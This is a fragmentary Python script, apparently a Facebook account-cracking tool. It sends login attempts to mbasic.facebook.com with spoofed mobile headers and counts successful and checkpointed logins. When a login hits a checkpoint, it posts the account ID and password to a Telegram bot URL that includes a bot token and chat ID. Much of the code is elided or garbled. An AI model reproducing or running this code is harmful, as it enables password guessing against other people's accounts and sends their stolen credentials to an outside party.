	...
	try:
		...
		with requests.Session() as r:
			try:
				...
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'mbasic.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-dest': 'document',})
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	print("\r\u001b[37;1mr[MRBX["+str(loop)+"|"+str(len(id))+"] [\u001b[32;1m"+str(ok)+"\u001b[37;1m=\u001b[33;1m"+str(cp)+"\u001b[37;1m]",end="")
...
'bi_xrwh': 0
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get(f"https://api.telegram.org/bot6091859454:AAHwIuDGJW-dxs4PIEGygTHh5beMDCZQcs8/sendMessage?chat_id=@monstr_nm&text=MRBX-OK  {idf} | {pw} ")
				print(f'\r\x1b[1;92m [ MRBX-OK ] {idf} | {pw} | {kuki}')
